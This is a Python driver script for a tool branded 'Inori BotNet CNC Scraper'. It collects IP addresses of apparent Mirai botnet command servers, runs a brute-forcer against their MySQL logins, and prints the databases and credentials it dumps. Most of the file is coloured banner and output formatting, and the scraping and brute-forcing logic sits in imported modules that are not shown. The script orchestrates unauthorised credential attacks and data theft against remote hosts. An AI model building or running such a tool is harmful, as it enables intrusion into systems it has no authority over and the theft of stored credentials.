from time import time

from modules.scrape import Scraper
from modules.bruter import Bruter

# -----------------------------------------------

class Colors:
    WHITE:     str = '\033[38;2;255;255;255m'
    PINKRED:   str = '\033[38;2;255;50;75m'
    LIME:      str = '\033[38;2;0;255;152m'
    RED:       str = '\033[38;2;255;0;0m'
    LIGHTRED:  str = '\033[38;2;255;25;50m'
    LIGHTPINK: str = '\033[38;2;255;100;255m'

# -----------------------------------------------

INORI: str = '\033[38;2;255;100;255mI\033[38;2;255;90;219mn\033[38;2;255;80;183mo\033[38;2;255;70;147mr\033[38;2;255;60;111mi'
MANA:  str = '\033[38;2;100;100;250mM\033[38;2;138;75;251ma\033[38;2;176;50;252mn\033[38;2;214;25;253ma'

BANNER: str = f"""\033[38;2;255;100;255m╦\033[38;2;255;96;240m╔\033[38;2;255;92;225m╗\033[38;2;255;88;210m╔\033[38;2;255;84;195m╔\033[38;2;255;80;180m═\033[38;2;255;76;165m╗\033[38;2;255;72;150m╦\033[38;2;255;68;135m═\033[38;2;255;64;120m╗\033[38;2;255;60;105m╦
\033[38;2;255;100;255m║\033[38;2;255;96;240m║\033[38;2;255;92;225m║\033[38;2;255;88;210m║\033[38;2;255;84;195m║\033[38;2;255;80;180m \033[38;2;255;76;165m║\033[38;2;255;72;150m╠\033[38;2;255;68;135m╦\033[38;2;255;64;120m╝\033[38;2;255;60;105m║
\033[38;2;255;100;255m╩\033[38;2;255;96;239m╝\033[38;2;255;92;223m╚\033[38;2;255;88;207m╝\033[38;2;255;84;191m╚\033[38;2;255;80;175m═\033[38;2;255;76;159m╝\033[38;2;255;72;143m╩\033[38;2;255;68;127m╚\033[38;2;255;64;111m═\033[38;2;255;60;95m╩ BotNet \033[38;2;255;255;255mCNC Scraper"""

SQL_FILTER: tuple = ('information_schema', 'performance_schema', 'Z_README_TO_RECOVER', 'mysql')

# -----------------------------------------------

if __name__ == '__main__' :
    print(f'\x1bc{BANNER}')
    
    mirai_scraper: object = Scraper()
    print(f'{Colors.WHITE}Scraped {Colors.LIGHTPINK}{len(mirai_scraper.list_ips)} {Colors.WHITE}IP Addresses')
    bruter = Bruter(mirai_scraper.list_ips)
    
    start: int = time()
    print(f'{Colors.WHITE}Executing {INORI}{Colors.WHITE}...\n')
    bruter.run()
    
    print(f'{Colors.WHITE}Found {Colors.LIME}{len(bruter.results)} {Colors.PINKRED}mirai {Colors.WHITE}CNC(s)\n')
    
    if bruter.results:
        print(bruter.results)
        for result in bruter.results:
            
            print(f"""{Colors.LIME}• {INORI} {Colors.WHITE}has logged in {Colors.PINKRED}{result['ip']} {Colors.WHITE}({Colors.LIGHTPINK}{result['mysql_login']}{Colors.WHITE}) {Colors.WHITE}({Colors.LIGHTPINK}{result['arch']}{Colors.WHITE})""")
            print(f' {Colors.LIGHTPINK}• {Colors.WHITE}Dumping databases...')
            if result['databases']:
                for database in result['databases']:
                    for db, creds in database.items():
                        print(f'{Colors.PINKRED}• {Colors.LIGHTPINK}{db}{Colors.WHITE}: {Colors.PINKRED}{f"{Colors.WHITE},{Colors.PINKRED} ".join(creds)}')
            else:
                print(f'{Colors.RED}• {Colors.WHITE}No database found.')
            print() 

              
    print(f'{Colors.WHITE}Execution speed: {Colors.LIGHTPINK}{str(time() - start).split(".")[0]} {Colors.WHITE}seconds.\n') 

# -----------------------------------------------